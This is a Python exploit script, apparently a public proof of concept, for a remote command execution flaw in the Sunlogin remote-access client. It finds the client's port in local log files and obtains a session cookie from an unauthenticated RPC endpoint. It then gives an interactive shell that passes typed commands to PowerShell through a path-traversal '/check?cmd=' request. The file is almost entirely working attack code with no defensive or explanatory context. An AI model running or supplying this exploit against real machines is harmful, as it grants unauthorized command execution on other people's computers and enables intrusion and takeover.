# -*- coding: UTF-8 -*-
import re
import sys

import requests
import json
import os,time
import argparse
requests.packages.urllib3.disable_warnings()

def get_port():
    Path = 'C:\ProgramData\Oray\SunloginClient\log'
    Txt = (time.strftime("%Y%m%d", time.localtime()))
    Txt_Path = []
    Txt_port = []
    ip_port = []
    for folderNames, subfolders, filenames in os.walk(str(Path)):
        for filename in filenames:
            if Txt in filename:
                Txt_Path.append(os.path.join(folderNames,filename))
                # print(Txt_Path)
    for i in Txt_Path:
        # print(i)
        f = open(i,encoding='gb18030', mode='r',errors='ignore')
        lines = f.read()
        # print(lines)
        get_port = re.search(r"tcp:\d\.\d\.\d\.\d:\d\d\d\d\d",lines)
        if get_port:
            Txt_port.append(get_port.group())
            # print(Txt_port)
        f.close()
    for i in Txt_port:
        ip_ports = re.search(r"\d\.\d\.\d\.\d:\d\d\d\d\d",i)
        ip_port.append(ip_ports.group())
        # print(ip_port)
    return ip_port

def ip_requetst():
    ip_urls = get_port()
    for ip_url in ip_urls:
        ip = ip_url.replace("0.0.0.0","127.0.0.1")
        # print(ip)
        try:
            url = "http://{0}/cgi-bin/rpc?action=verify-haras".format(ip)
            r = requests.get(url,allow_redirects=False)
            if r.status_code != 200:
                continue
            else:
                print("Found effective Ip:Port："+ip)
        except:
            pass

def get_cookie(ip_port, proxies):
    url = "http://{ip_port}/cgi-bin/rpc?action=verify-haras".format(ip_port=ip_port)
    # 192.168.2.58:54381
    payload = ""
    headers = {
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "User-Agent": "SLRC/11.0.0.33162 (Windows,x64)Chrome/98.0.4758.82 Safari/537.36",
        "Host": "{ip_port}".format(ip_port=ip_port),
        "Accept-Encoding": "gzip, deflate",
        "Upgrade-Insecure-Requests": "1",
        "Accept-Language": "zh-CN,zh;q=0.9",
        "Proxy-Connection": "keep-alive"
    }
    response = requests.request("GET", url, data=payload, headers=headers, verify=False, proxies=proxies)
    # print(response)
    # print(response.status_code)
    print("response: {}".format(response.text))
    cookie = None
    try:
        json_str = json.loads(response.text)
        # print("json_str", json_str)
        cookie = json_str["verify_string"]
        # print("cookie", cookie)
    except Exception as e:
        print(str(e))
    return cookie


def run_cmd(ip_port, cookie, cmd, proxies):
    url = f"http://{ip_port}/check?cmd=ping..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fsystem32%2FWindowsPowerShell%2Fv1.0%2Fpowershell.exe+{cmd}".format(
        ip_port=ip_port, cmd=cmd)
    payload = ""
    headers = {
        "Cookie": "CID={cookie};".format(cookie=cookie),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "User-Agent": "SLRC/11.0.0.33162 (Windows,x64)Chrome/98.0.4758.82 Safari/537.36",
        "Host": "{ip_port}".format(ip_port=ip_port),
        "Accept-Encoding": "gzip, deflate",
        "Upgrade-Insecure-Requests": "1",
        "Accept-Language": "zh-CN,zh;q=0.9",
        "Proxy-Connection": "keep-alive"
    }
    response = requests.request("GET", url, data=payload, headers=headers, verify=False, proxies=proxies)
    # print(response.status_code)
    # print(response)
    # print(response.content)
    response.encoding = 'gb2312'
    print(response.text)

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.description = "Sun Login RCE CMD ..."
    parser.add_argument("-i", "--host", help="Specifies a ip:port")
    parser.add_argument("-p", "--proxies", help="Specify the requests proxy address, support Socks5 and HTTP, for example: http://127.0.0.1:8080 or socks5://127.0.0.1:1080", default=None)
    parser.add_argument("-g","--get",help="Get server ip:port,The default path:C:\ProgramData\Oray\SunloginClient\log")
    args = parser.parse_args()

    if args.proxies !=None: args.proxies={ 'http': args.proxies.replace('https://','http://') , 'https': args.proxies.replace('http://','https://')  }
    ip_port = args.host
    port_get = args.get
    if args.get == "get":
        ip_requetst()
        sys.exit()
    #cmd = args.cmd
    cookie = get_cookie(ip_port,args.proxies)
    print("cookie: {}".format(cookie))
    if cookie is not None:
        while True:
            cmd = input("输入需要执行的命令(按q退出):")
            if cmd == 'q':
                break
            else:
                run_cmd(ip_port, cookie, cmd,args.proxies)
    else:
        print("SunLogin Cookie获取失败!!! 漏洞不存在...")